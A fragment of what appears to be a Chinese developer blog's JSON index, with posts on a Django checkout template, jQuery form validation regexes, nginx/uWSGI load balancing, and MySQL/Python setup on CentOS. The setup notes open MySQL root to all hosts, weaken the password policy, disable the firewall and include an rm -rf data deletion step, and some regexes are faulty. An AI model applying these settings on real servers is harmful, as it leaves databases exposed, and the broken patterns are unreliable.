onfocus=&quot;check_focus(&#x27;spn_country_province_city&#x27;);&quot; onblur=&quot;check_country_province_city();&quot; onchange=&quot;set_city(this.options[this.selectedIndex].value);&quot; style=&quot;display: block;&quot;&gt;&lt;option value=&quot;0&quot;&gt;--请选择--&lt;/option&gt;&lt;option value=&quot;111&quot;&gt;北京&lt;/option&gt;&lt;option value=&quot;112&quot;&gt;天津&lt;/option&gt;&lt;option value=&quot;113&quot;&gt;河北&lt;/option&gt;&lt;option value=&quot;114&quot;&gt;山西&lt;/option&gt;&lt;option value=&quot;115&quot;&gt;内蒙古&lt;/option&gt;&lt;option value=&quot;121&quot;&gt;辽宁&lt;/option&gt;&lt;option value=&quot;122&quot;&gt;吉林&lt;/option&gt;&lt;option value=&quot;123&quot;&gt;黑龙江&lt;/option&gt;&lt;option value=&quot;131&quot;&gt;上海&lt;/option&gt;&lt;option value=&quot;132&quot;&gt;江苏&lt;/option&gt;&lt;option value=&quot;133&quot;&gt;浙江&lt;/option&gt;&lt;option value=&quot;134&quot;&gt;安徽&lt;/option&gt;&lt;option value=&quot;135&quot;&gt;福建&lt;/option&gt;&lt;option value=&quot;136&quot;&gt;江西&lt;/option&gt;&lt;option value=&quot;137&quot;&gt;山东&lt;/option&gt;&lt;option value=&quot;141&quot;&gt;河南&lt;/option&gt;&lt;option value=&quot;142&quot;&gt;湖北&lt;/option&gt;&lt;option value=&quot;143&quot;&gt;湖南&lt;/option&gt;&lt;option value=&quot;144&quot;&gt;广东&lt;/option&gt;&lt;option value=&quot;145&quot;&gt;广西&lt;/option&gt;&lt;option value=&quot;146&quot;&gt;海南&lt;/option&gt;&lt;option value=&quot;150&quot;&gt;重庆&lt;/option&gt;&lt;option value=&quot;151&quot;&gt;四川&lt;/option&gt;&lt;option value=&quot;152&quot;&gt;贵州&lt;/option&gt;&lt;option value=&quot;153&quot;&gt;云南&lt;/option&gt;&lt;option value=&quot;154&quot;&gt;西藏&lt;/option&gt;&lt;option value=&quot;161&quot;&gt;陕西&lt;/option&gt;&lt;option value=&quot;162&quot;&gt;甘肃&lt;/option&gt;&lt;option value=&quot;163&quot;&gt;青海&lt;/option&gt;&lt;option value=&quot;164&quot;&gt;宁夏&lt;/option&gt;&lt;option value=&quot;165&quot;&gt;新疆&lt;/option&gt;&lt;option value=&quot;171&quot;&gt;台湾&lt;/option&gt;&lt;option value=&quot;172&quot;&gt;香港&lt;/option&gt;&lt;option value=&quot;173&quot;&gt;澳门&lt;/option&gt;&lt;option value=&quot;33&quot;&gt;其他省份&lt;/option&gt;&lt;/select&gt; &lt;select id=&quot;city_id&quot; name=&quot;city_id&quot;&gt;&lt;option value=&quot;0&quot;&gt;请选择&lt;/option&gt;&lt;/select&gt; &lt;select id=&quot;town_id&quot; name=&quot;town_id&quot; &gt;&lt;option value=&quot;0&quot;&gt;请选择&lt;/option&gt;&lt;/select&gt; &lt;select id=&quot;quarter_id&quot; name=&quot;quarter_id&quot; &gt;&lt;option value=&quot;0&quot;&gt;请选择&lt;/option&gt;&lt;/select&gt;&lt;/li&gt; &lt;li&gt;&lt;label&gt;&lt;strong&gt;*&lt;/strong&gt;详细地址：&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;ship_man&quot; id=&quot;address&quot; style=&quot;pointer-events: inherit;&quot;&gt; &lt;span id=&quot;spn_ship_address&quot; class=&quot;hint new_tip&quot; style=&quot;display: none;&quot;&gt;详细地址格式为xx省xx市&lt;/span&gt;&lt;/li&gt; &lt;li&gt;&lt;label&gt;&lt;strong&gt;*&lt;/strong&gt;邮政编码：&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;ship_man&quot; id=&quot;post&quot; style=&quot;pointer-events: inherit;&quot;&gt; &lt;span id=&quot;spn_ship_post&quot; class=&quot;hint new_tip&quot; style=&quot;display: none;&quot;&gt;邮编输入错误&lt;/span&gt;&lt;/li&gt; &lt;/li&gt;&lt;li&gt;&lt;label&gt;&lt;strong&gt;*&lt;/strong&gt; 手&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;机：&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;ship_man&quot; id=&quot;cellphone&quot; style=&quot;pointer-events: inherit;&quot;&gt; &lt;label&gt;或&amp;nbsp;&amp;nbsp;固定电话&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;ship_man&quot; id=&quot;addr_mobile&quot; style=&quot;pointer-events: inherit;&quot;&gt; &lt;span id=&quot;spn_ship_phone&quot; class=&quot;hint new_tip&quot; style=&quot;display: none;&quot;&gt;请输入手机号或者固定电话&lt;/span&gt;&lt;/li&gt;&lt;/li&gt;&lt;/ul&gt;&lt;div class=&quot;balance&quot;&gt;&lt;p&gt;商品金额：¥&#123;&#123; sum_price &#125;&#125;&lt;/p&gt;&lt;p class=&quot;yfze&quot;&gt;应付总额（含运费）：&lt;em&gt;¥&#123;&#123; sum_price &#125;&#125;&lt;/em&gt;&lt;/p&gt;&lt;p&gt; &lt;a href=&quot;javascript:void (0);&quot; id=&quot;order_sumbit&quot;&gt;提交订单&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;shdz&quot;&gt; &lt;h3&gt;订单1（百知网配送）&lt;/h3&gt; &lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot;&gt; &lt;tbody&gt;&lt;tr style=&quot;height:30px; line-height:30px;&quot;&gt; &lt;th width=&quot;34%&quot;&gt;商品名称&lt;/th&gt; &lt;th width=&quot;11%&quot;&gt;所在仓库&lt;/th&gt; &lt;th width=&quot;13%&quot;&gt;百知价&lt;/th&gt; &lt;th width=&quot;11%&quot;&gt;促销价&lt;/th&gt; &lt;th width=&quot;9%&quot;&gt;数量&lt;/th&gt; &lt;th width=&quot;11%&quot;&gt;小计&lt;/th&gt; &lt;th width=&quot;11%&quot;&gt;操作&lt;/th&gt; &lt;/tr&gt; &#123;% for foo in car %&#125; &lt;tr&gt; &lt;td&gt;&#123;&#123; foo.book.book_name &#125;&#125;&lt;/td&gt; &lt;td align=&quot;center&quot;&gt;&#123;&#123; foo.book.publish &#125;&#125;&lt;/td&gt; &lt;td align=&quot;center&quot;&gt;¥&#123;&#123; foo.book.new_price &#125;&#125;（&#123;&#123; foo.book.discount &#125;&#125;折）&lt;/td&gt; &lt;td align=&quot;center&quot;&gt;--&lt;/td&gt; &lt;td align=&quot;center&quot;&gt;&#123;&#123; foo.count &#125;&#125;&lt;/td&gt; &lt;td align=&quot;center&quot;&gt;¥&#123;&#123; foo.totalprice &#125;&#125;&lt;/td&gt; &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;javascript:void (0);&quot;&gt;放回购物车&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &#123;% endfor %&#125; &lt;tr&gt; &lt;td colspan=&quot;2&quot;&gt;&lt;input type=&quot;checkbox&quot; &gt;此订单作为礼品赠送他人&lt;/td&gt; &lt;td colspan=&quot;2&quot;&gt;&lt;strong&gt;运费：&lt;/strong&gt;当确认送货方式后显示&lt;/td&gt; &lt;td class=&quot;table_zj&quot; colspan=&quot;3&quot;&gt;&lt;strong&gt;小计总额：&lt;/strong&gt;&lt;em&gt;¥&#123;&#123; sum_price &#125;&#125;&lt;/em&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;","categories":[],"tags":[{"name":"项目","slug":"项目","permalink":"http://example.com/tags/%E9%A1%B9%E7%9B%AE/"}]},{"title":"jQuery-配送地址下拉框","slug":"jQuery-配送地址下拉框","date":"2020-09-17T12:14:59.000Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2020/09/17/jQuery-配送地址下拉框/","permalink":"http://example.com/2020/09/17/jQuery-%E9%85%8D%E9%80%81%E5%9C%B0%E5%9D%80%E4%B8%8B%E6%8B%89%E6%A1%86/","excerpt":"jQuery-配送地址下拉框 使用jQuery-配送地址下拉框","text":"jQuery-配送地址下拉框 使用jQuery-配送地址下拉框 jQuery-配送地址下拉框1234567891011121314151617&#123;# 选择配送地址 #&#125;$(&#x27;#select&#x27;).change(function () &#123; var a = $(&#x27;#select option:selected&#x27;); if (a.val() !== &quot;&quot;) &#123; $(&#x27;input[type=&quot;text&quot;]&#x27;).attr(&#x27;readonly&#x27;,&#x27;readonly&#x27;); $($(&#x27;input[type=&quot;text&quot;]&#x27;)[0]).val(a.attr(&#x27;name&#x27;)); $($(&#x27;input[type=&quot;text&quot;]&#x27;)[1]).val(a.attr(&#x27;address&#x27;)); $($(&#x27;input[type=&quot;text&quot;]&#x27;)[2]).val(a.attr(&#x27;post_code&#x27;)); $($(&#x27;input[type=&quot;text&quot;]&#x27;)[3]).val(a.attr(&#x27;addr_mobile&#x27;)); $($(&#x27;input[type=&quot;text&quot;]&#x27;)[4]).val(a.attr(&#x27;cell_phone&#x27;)); &#125;else &#123; $(&#x27;input[type=&quot;text&quot;]&#x27;).attr(&#x27;readonly&#x27;,&#x27;&#x27;); for (var i=0; i &lt; $(&#x27;input[type=&quot;text&quot;]&#x27;).size();i++) &#123; $($(&#x27;input[type=&quot;text&quot;]&#x27;)[i]).val(&quot;&quot;) &#125; &#125;&#125;) html样式12345678910111213141516171819202122&lt;div class=&quot;address&quot; id=&quot;dp_adress&quot;&gt; &lt;span class=&quot;icon_adr&quot;&gt;&amp;nbsp;&lt;/span&gt;配送地址： &#123;% if address %&#125; &lt;div class=&quot;select_add&quot;&gt; &lt;select name=&quot;&quot; id=&quot;select&quot; class=&quot;text fn-select-address&quot;&gt; &lt;option value=&quot;&quot; class=&quot;select_add1&quot;&gt;请选择收货地址&lt;/option&gt; &#123;% for address1 in address %&#125; &lt;option class=&quot;select_add1&quot; value=&quot;&#123;&#123; address1.id &#125;&#125;&quot; name=&quot;&#123;&#123; address1.name &#125;&#125;&quot; address=&quot;&#123;&#123; address1.address &#125;&#125;&quot; post_code=&quot;&#123;&#123; address1.post_code &#125;&#125;&quot; cellphone=&quot;&#123;&#123; address1.cellphone &#125;&#125;&quot; addr_mobile=&quot;&#123;&#123; address1.addr_mobile &#125;&#125;&quot; class=&quot;address_select&quot;&gt;&#123;&#123; address1.address &#125;&#125;&lt;/option&gt; &#123;% endfor %&#125; &lt;/select&gt; &#123;% else %&#125; &lt;div class=&quot;select_add&quot;&gt; &lt;select name=&quot;&quot; id=&quot;select_add&quot; class=&quot;text fn-select-address&quot;&gt; &lt;option value=&quot;请选择收货地址&quot;&gt;您还没有添加收货地址&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;/div&gt; &#123;% endif %&#125; &lt;!--&lt;a href=&quot;#&quot; class=&quot;tip&quot;&gt;&lt;/a&gt;--&gt; &lt;span class=&quot;tip_c&quot; style=&quot;display:none;&quot;&gt;针对不同配送地址，您的货物可能出现缺货或无货状态，敬请谅解。&lt;/span&gt;&lt;/div&gt;","categories":[],"tags":[{"name":"jQuery","slug":"jQuery","permalink":"http://example.com/tags/jQuery/"}]},{"title":"jQuery-前端正则化校验","slug":"Jquery-前端正则化校验","date":"2020-09-14T09:29:50.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/09/14/Jquery-前端正则化校验/","permalink":"http://example.com/2020/09/14/Jquery-%E5%89%8D%E7%AB%AF%E6%AD%A3%E5%88%99%E5%8C%96%E6%A0%A1%E9%AA%8C/","excerpt":"邮箱,手机号,密码强度 正则校验 比较常用的正则校验","text":"邮箱,手机号,密码强度 正则校验 比较常用的正则校验 jQuery-前端正则化校验失焦校验验证用户名是否为邮箱或手机号1&lt;script src=&quot;/static/js/jquery.1.4.2-min.js&quot;&gt;&lt;/script&gt; 123456789101112131415&#123;#table下的所有的收入框失焦验证信息#&#125;$(&#x27;#txt_username&#x27;).blur(function () &#123; var re_phone = /^1[34578]\\d&#123;9&#125;$/; var re_email = /^[a-zA-Z0-9_-]+@([a-zA-Z0-9_-])+\\.[A-Za-z]&#123;2,3&#125;/; //根据判断结果相应改变效果 if (re_phone.test($(&quot;#txt_username&quot;).val()) || re_email.test($(&quot;#txt_username&quot;).val())) &#123; $(&quot;#spn_username_ok&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spn_username_ok&quot;).attr(&#x27;class&#x27;,&#x27;icon_yes&#x27;); $(&quot;#spn_username_ok&quot;).html(&#x27;&#x27;); &#125;else &#123; $(&quot;#spn_username_ok&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spn_username_ok&quot;).attr(&#x27;class&#x27;,&#x27;&#x27;); $(&quot;#spn_username_ok&quot;).html(&#x27;请检查手机号或邮箱的格式！&#x27;); &#125;&#125;); 失焦校验密码强弱程度12345678910111213141516171819202122232425262728293031323334353637383940&#123;# 密码强弱 #&#125; $(&#x27;#txt_password&#x27;).blur(function () &#123; var re_week = /^.*(?=.&#123;6,&#125;)(?=.*\\d).*$|^.*(?=.&#123;6,&#125;)(?=.*[A-Za-z]).*$/; var re_medium = /^.*(?=.&#123;6,&#125;)(?=.*\\d)(?=.*[A-Za-z]).*$/; var re_strong = /^.*(?=.&#123;6,&#125;)(?=.*\\d)(?=.*[A-Za-z])(?=.*[!@#$%^&amp;*?]).*$/; var pwd = $(&quot;#txt_password&quot;).val(); if (pwd.length &lt; 6)&#123; $(&quot;#spn_epassword_ok&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#spn_epassword_ok&quot;).attr(&#x27;class&#x27;,&#x27;icon_wrong&#x27;); $(&quot;#spnPwdStrong2&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#spnPwdStrong1&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#spnPwdStrong3&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#J_tipPassword&quot;).html(&quot;密码长度小于6位&quot;) return false &#125; else if (re_strong.test(pwd)) &#123; $(&quot;#spnPwdStrong3&quot;).css(&#x27;display&#x27;, &#x27;inline-block&#x27;); $(&quot;#spnPwdStrong2&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#spnPwdStrong1&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#J_tipPassword&quot;).html(&#x27;&#x27;); $(&quot;#spn_epassword_ok&quot;).css(&#x27;display&#x27;, &#x27;inline-block&#x27;); $(&quot;#spn_epassword_ok&quot;).attr(&#x27;class&#x27;, &#x27;icon_yes&#x27;); return true &#125;else if (re_medium.test(pwd)) &#123; $(&quot;#spnPwdStrong2&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spnPwdStrong1&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#spnPwdStrong3&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#J_tipPassword&quot;).html(&#x27;&#x27;); $(&quot;#spn_epassword_ok&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spn_epassword_ok&quot;).attr(&#x27;class&#x27;,&#x27;icon_yes&#x27;); return true &#125;else if (re_week.test(pwd))&#123; $(&quot;#spnPwdStrong1&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spnPwdStrong2&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#spnPwdStrong3&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#J_tipPassword&quot;).html(&#x27;&#x27;); $(&quot;#spn_epassword_ok&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spn_epassword_ok&quot;).attr(&#x27;class&#x27;,&#x27;icon_yes&#x27;); return true &#125; &#125;); 比较常用的正则校验12345678910111213141516//校验普通电话、传真号码：可以“+”开头，除数字外，可含有“-” var patrn = /^[+]&#123;0,1&#125;(d)&#123;1,4&#125;[ ]?([-]?((d)|[ ])&#123;1,12&#125;)+$/;//校验邮政编码 var patrn = /^[a-zA-Z0-9 ]&#123;3,12&#125;$/;//校验是否IP地址 var patrn = /^[0-9.]&#123;1,20&#125;$/;//校验密码强弱var re_week = /^.*(?=.&#123;6,&#125;)(?=.*\\d).*$|^.*(?=.&#123;6,&#125;)(?=.*[A-Za-z]).*$/;var re_medium = /^.*(?=.&#123;6,&#125;)(?=.*\\d)(?=.*[A-Za-z]).*$/;var re_strong = /^.*(?=.&#123;6,&#125;)(?=.*\\d)(?=.*[A-Za-z])(?=.*[!@#$%^&amp;*?]).*$/;//校验电话var re_phone = /^1[34578]\\d&#123;9&#125;$/;//校验emailvar re_email = /^[a-zA-Z0-9_-]+@([a-zA-Z0-9_-])+\\.[A-Za-z]&#123;2,3&#125;/; 123456789101112131415Email地址：^\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)*$域名：[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(\\.[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;)+\\.?InternetURL：[a-zA-z]+://[^\\s]* 或 ^http://([\\w-]+\\.)+[\\w-]+(/[\\w-./?%&amp;=]*)?$手机号码：^(13[0-9]|14[5|7]|15[0|1|2|3|4|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\\d&#123;8&#125;$电话号码(&quot;XXX-XXXXXXX&quot;、&quot;XXXX-XXXXXXXX&quot;、&quot;XXX-XXXXXXX&quot;、&quot;XXX-XXXXXXXX&quot;、&quot;XXXXXXX&quot;和&quot;XXXXXXXX)：^(\\(\\d&#123;3,4&#125;-)|\\d&#123;3.4&#125;-)?\\d&#123;7,8&#125;$国内电话号码(0511-4405222、021-87888822)：\\d&#123;3&#125;-\\d&#123;8&#125;|\\d&#123;4&#125;-\\d&#123;7&#125;电话号码正则表达式（支持手机号码，3-4位区号，7-8位直播号码，1－4位分机号）: ((\\d&#123;11&#125;)|^((\\d&#123;7,8&#125;)|(\\d&#123;4&#125;|\\d&#123;3&#125;)-(\\d&#123;7,8&#125;)|(\\d&#123;4&#125;|\\d&#123;3&#125;)-(\\d&#123;7,8&#125;)-(\\d&#123;4&#125;|\\d&#123;3&#125;|\\d&#123;2&#125;|\\d&#123;1&#125;)|(\\d&#123;7,8&#125;)-(\\d&#123;4&#125;|\\d&#123;3&#125;|\\d&#123;2&#125;|\\d&#123;1&#125;))$)身份证号(15位、18位数字)，最后一位是校验位，可能为数字或字符X：(^\\d&#123;15&#125;$)|(^\\d&#123;18&#125;$)|(^\\d&#123;17&#125;(\\d|X|x)$)帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]&#123;4,15&#125;$密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：^[a-zA-Z]\\w&#123;5,17&#125;$强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在 8-10 之间)：^(?=.*\\d)(?=.*[a-z])(?=.*[A-Z])[a-zA-Z0-9]&#123;8,10&#125;$强密码(必须包含大小写字母和数字的组合，可以使用特殊字符，长度在8-10之间)：^(?=.*\\d)(?=.*[a-z])(?=.*[A-Z]).&#123;8,10&#125;$日期格式：^\\d&#123;4&#125;-\\d&#123;1,2&#125;-\\d&#123;1,2&#125;一年的12个月(01～09和1～12)：^(0?[1-9]|1[0-2])$一个月的31天(01～09和1～31)：^((0?[1-9])|((1|2)[0-9])|30|31)$","categories":[],"tags":[{"name":"jQuery","slug":"jQuery","permalink":"http://example.com/tags/jQuery/"}]},{"title":"Jquery-实现倒计时跳转","slug":"Jquery-实现倒计时跳转","date":"2020-09-14T08:07:55.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/09/14/Jquery-实现倒计时跳转/","permalink":"http://example.com/2020/09/14/Jquery-%E5%AE%9E%E7%8E%B0%E5%80%92%E8%AE%A1%E6%97%B6%E8%B7%B3%E8%BD%AC/","excerpt":"jquery以及js实现自动跳转界面","text":"jquery以及js实现自动跳转界面 Jquery-实现倒计时跳转jquery实现 1234567891011121314151617&lt;script src=&quot;js/jquery-1.12.4.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; //使用匿名函数方法 function counttime() &#123; var $time = $(&#x27;#Time&#x27;); if($time.html() === &#x27;1&#x27;)&#123; window.location.href=(&quot;http://www.baidu.com&quot;); &#125;else&#123; $time.html($time.html()-1); &#125; &#125; setInterval(counttime,1000);&lt;/script&gt;&lt;body&gt; &lt;p id=&quot;Time&quot;&gt;5&lt;/p&gt;&lt;/body&gt; js实现 12345678910111213141516171819&lt;script&gt; //使用匿名函数方法 function countDown()&#123; var time = document.getElementById(&quot;Time&quot;); //alert(time.innerHTML); //获取到id为time标签中的内容，现进行判断 if(time.innerHTML == 0)&#123; //等于0时清除计时 window.location.href=&quot;https://www.baidu.com&quot;; &#125;else&#123; time.innerHTML = time.innerHTML-1; &#125; &#125; //1000毫秒调用一次 setInterval(countDown,1000);&lt;/script&gt;&lt;body&gt; &lt;p id=&quot;Time&quot;&gt;5&lt;/p&gt;&lt;/body&gt;","categories":[],"tags":[{"name":"Jquery","slug":"Jquery","permalink":"http://example.com/tags/Jquery/"}]},{"title":"Pycharm连接MySQL问腿","slug":"Pycharm连接MySQL问腿","date":"2020-09-03T23:32:18.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/09/04/Pycharm连接MySQL问腿/","permalink":"http://example.com/2020/09/04/Pycharm%E8%BF%9E%E6%8E%A5MySQL%E9%97%AE%E8%85%BF/","excerpt":"Pycharm连接MySQL数据库问题报错08001","text":"Pycharm连接MySQL数据库问题报错08001 Pycharm连接MySQL问题问题:错误编号08001解决办法:123456781.在终端里先使用管理员登录mysql，也就是root mysql -uroot -p123 输入命令 show variables like &#x27;%time_zone%&#x27;2.Mysql默认为美国时间，我国时区要晚8小时，因此修改时间即可 set global time_zone = &#x27;+8:00&#x27; ; FLUSH PRIVILEGES;3.设置完以后，退出mysql,重新登录，检查时间是否被修改","categories":[],"tags":[{"name":"Pycharm","slug":"Pycharm","permalink":"http://example.com/tags/Pycharm/"}]},{"title":"Linux-Nginx环境部署","slug":"Linux-Nginx环境部署","date":"2020-09-03T09:50:14.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/09/03/Linux-Nginx环境部署/","permalink":"http://example.com/2020/09/03/Linux-Nginx%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/","excerpt":"Nginx是一款轻量级的Web服务器&#x2F;反向代理服务器 ，其特点是占有内存少，并发能力强。","text":"Nginx是一款轻量级的Web服务器&#x2F;反向代理服务器 ，其特点是占有内存少，并发能力强。 Nginx服务器一、Nginx概述1、简介1.1 什么nginxNginx是一款轻量级的Web服务器&#x2F;反向代理服务器 ，其特点是占有内存少，并发能力强。 2.2 nginx的作用 静态HTTP服务器（ 处理静态资源 - 动静分离）： 首先，Nginx是一个HTTP服务器，可以将服务器上的静态文件（图片、CSS、JS文件等）通过HTTP协议展现给客户端。 将静态资源的处理交给Nginx服务器 123# 一个项目中的资源可以为两大类： 1. 动态资源的请求 普通URL -- uwsgi 2. 静态资源的请求 /static/ -- nginx Nginx提供的动静分离是指把动态请求和静态请求分离开，合适的服务器处理合适的请求，使整个服务器系统的性能、效率更高。 uWSGI更适合做动态内容的执行，nginx更适合做静态内容的处理，客户端请求直接访问nginx服务器，留下静态部分处理，动态部分转发给uWSGI服务器，最终实现“动静分离”。 反向代理服务器： 反向代理是指以代理服务器nginx来接受internet上的请求，然后将请求转发给内部网络上的其它服务器uWSGI，并将从uWSGI服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。 负载均衡 ： 多在高并发情况下需要使用。其原理就是将数据流量分摊到多个服务器执行，减轻每台服务器的压力，多台服务器(集群)共同完成工作任务，从而提高了数据的吞吐量。 2、安装步骤 将tar包发送的linux 解压 tar -zxvf nginx-1.11.1.tar.gz 安装依赖 yum install gcc zlib-devel pcre-devel cd到解压目录：./configure #配置检测 cd到解压目录：make &amp;&amp; make install #编译并安装 安装完成，安装路径为/usr/local/nginx ,日志路径为 /usr/local/nginx/logs , 可执行文件路径为 /usr/local/nginx/sbin ,配置文件路径为 /usr/local/nginx/conf 欢迎页面路径为 /usr/local/nginx/html ln -s /usr/local/nginx/sbin/nginx /usr/bin/nginx 制作连接，便于执行nginx指令 nginx #启动nginx -s stop #关闭nginx -s reload #重启 http://ip:80即可访问nginx欢迎页面 二、nginx与uWSGInginx配置–到配置路径中的nginx.conf /usr/local/nginx/conf/nginx.conf 1234567891011121314151617181920upstream ems&#123; server 192.168.157.141:9001; # uWSGI&#x27;s socket = #server 192.168.157.142:9001; #192.168.x.x:9001 #可以在添加其他的uWSGI的服务器&#125;server &#123; listen 80; server_name 192.168.157.142; # nginx服务器的ip charset utf-8; location / &#123; uwsgi_pass ems; #和上面的upstream转接 include /usr/local/nginx/conf/uwsgi_params; &#125; location /static &#123; alias /usr/local/static; &#125; ...｝ 配置好后，重启nginx即可，可以使用Nginx服务器来访问项目 注意关闭防火墙！！ 两台虚拟主机，一个运行nginx，其中保存project的静态资源；一个运行uwsgi，其中保存并部署project。 三、集群和负载均衡策略搭建uWSGI集群，只需要多做几份uWSGI的配置文件，文件中设置不同的ip:port，指向相同的project，然后启动多个uWSGI即可。 12345678910111213141516171819202122*默认:轮询 upstream django &#123; server 192.168.0.103:8989; server 192.168.0.104:8989; &#125;*iphash:基于ip的负载均衡. upstream django &#123; ip_hash; server 192.168.0.103:8989; server 192.168.0.104:8990; &#125;*权重轮询: upstream django &#123; server 192.168.0.103:8989 weight=1; server 192.168.0.104:8990 weight=2; &#125;*最小连接数： upstream django &#123; least_conn; server 192.168.0.103:8989; server 192.168.0.104:8990; &#125; 至此，一个uWSGI集群搭建完成，nginx作为反向代理服务器和web服务器接收请求，然后处理静态的部分，动态部分按照负载均衡策略转发给某一个uWSGI服务器。 123# 集群解决了什么问题： 1. 高并发 2. 高完整性（高可用性） 至此python-web-project成功运行于 一个对高并发有更好支持，具有高可用性（high-available）的系统中","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"Linux-环境部署收集","slug":"Linux-环境部署收集","date":"2020-09-03T09:47:36.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/09/03/Linux-环境部署收集/","permalink":"http://example.com/2020/09/03/Linux-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%E6%94%B6%E9%9B%86/","excerpt":"MySQL5.7安装 ,Python安装,Django安装,uWSGI服务器","text":"MySQL5.7安装 ,Python安装,Django安装,uWSGI服务器 项目环境部署一、MySQL5.7安装1、安装方式1.1 方式一 yum安装（推荐使用该方式）在CentOS中默认安装有MariaDB，这个是MySQL的分支 如果必须要安装MySQL，首先必须添加mysql社区repo通过输入命令： rpm -ivh http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm 然后再yum install -y mysql-server # yum安装，需要外网环境 1.2 方式二 rpm安装（不建议） rpm -ivh perl-*.rpm #安装所有perl依赖 rpm -Uvh mysql-libs-5.1.73-7.el6.i686.rpm #更新mysql的类库 rpm -ivh mysql-5.1.73-7.el6.i686.rpm mysql-server-5.1.73-7.el6.i686.rpm #安装mysql主服务 2、启动MySQL服务 systemctl start/stop/restart/status mysqld 查看MySQL运行状态： systemctl status mysqld.service 3、使用MySQL注意：以下方式针对mysql5.7 初次使用，需要找到root的密码： grep &quot;password&quot; /var/log/mysqld.log 找到密码后，连接数据库 mysql -uroot -p密码 输入初始密码，此时不能做任何事情，因为MySQL默认必须修改密码之后才能操作数据库： ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;new password&#39;; 1234567891011遇到错误： ERROR 1819 (HY000): Your password does not satisfy the current policy requirements 解决方案：1、首先需要设置密码的验证强度等级，设置 validate_password_policy 的全局参数为 LOW 即可，输入设值语句 “ set global validate_password_policy=LOW; ” 进行设值2、当前密码长度为 8 ，如果不介意的话就不用修改了，按照通用的来讲，设置为 6 位的密码，设置 validate_password_length 的全局参数为 6 即可，输入设值语句 “ set global validate_password_length=6; ” 进行设值3、再重置密码ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;new password&#x27;;4、查看 mysql 初始的密码策略，输入语句 “ SHOW VARIABLES LIKE &#x27;validate_password%&#x27;; ” 进行查看 选择数据库use mysql 选择表 查询表 4、MySQL远程连接 到mysql库的user表中 update user set host=&#39;%&#39; where user=&#39;root&#39;; #添加可以远程访问的账号 MySQL5.7版本 flush privileges; #刷新权限，保证新添加的账号可用 关闭linux的防火墙，保证3306可以访问 5、MySQL卸载 rpm -e mysql-server需要完整的包名 通过rpm -qa | grep mysql查找包名 #只需卸载主服务即可 rm -rf /var/lib/mysql #删除所有mysql的数据 6、MySQL root密码找回（重置）找到/etc/my.cnf 123[mysqld]...skip-grant-tables //注意，建议在拆除网线的情况下添加 (而且添加配置后，需要重启mysqld服务) 1234[root@Server ~] mysql -urootmysql&gt; use mysql;mysql&gt; update user set password=password(&#x27;123&#x27;) where host=&#x27;localhost&#x27;; //修改密码mysql&gt; flush privileges; 然后将如上配置删除或注释 123# 将开发好的项目部署到Linux系统 Linux 而不是windows （开发）# Day01 - Linux基本指令 -- 字符界面 无法使用鼠标# Day02 - 安装环境MySQL Python 上传项目 部署运行项目 二、Python安装1、安装依赖 yum -y install python-devel openssl-devel bzip2-devel zlib-devel expat-devel ncurses-devel sqlite-devel gdbm-devel xz-devel tk-devel readline-devel gcc yum -y groupinstall “Development tools” 如上两步，汇总安装了python生产环境的各种第三方依赖包 2、安装Python 将python的tar包发送给linux 